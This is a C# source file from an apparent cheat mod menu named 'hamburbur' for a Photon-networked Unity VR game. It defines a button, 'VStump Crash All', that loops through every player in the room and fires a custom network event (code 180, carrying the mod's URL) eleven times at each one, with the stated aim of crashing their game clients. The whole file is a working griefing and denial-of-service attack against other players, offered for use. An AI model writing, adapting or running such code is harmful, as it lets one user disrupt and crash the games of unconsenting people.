using System.Collections;
using ExitGames.Client.Photon;
using hamburbur.Managers;
using hamburbur.Mod_Backend;
using hamburbur.Tools;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace hamburbur.Mods.OP;

[hamburburmod("VStump Crash All", "Crashes them all", ButtonType.Fixed, AccessSetting.Public, EnabledType.Disabled,
        0)]
public class VStumpCrashAll : hamburburmod
{
    protected override void Pressed() => CoroutineManager.Instance.StartCoroutine(CrashAll());

    private static IEnumerator CrashAll()
    {
        foreach (VRRig rig in NetworkSystem.Instance.Rigs())
        {
            for (int i = 0; i < 11; i++)
                PhotonNetwork.RaiseEvent(180,
                        new object[]
                                { Constants.HamburburUrl, true, },
                        new RaiseEventOptions { TargetActors = [rig.creator.ActorNumber,], },
                        SendOptions.SendUnreliable);

            yield return new WaitForSeconds(2);
        }
    }
}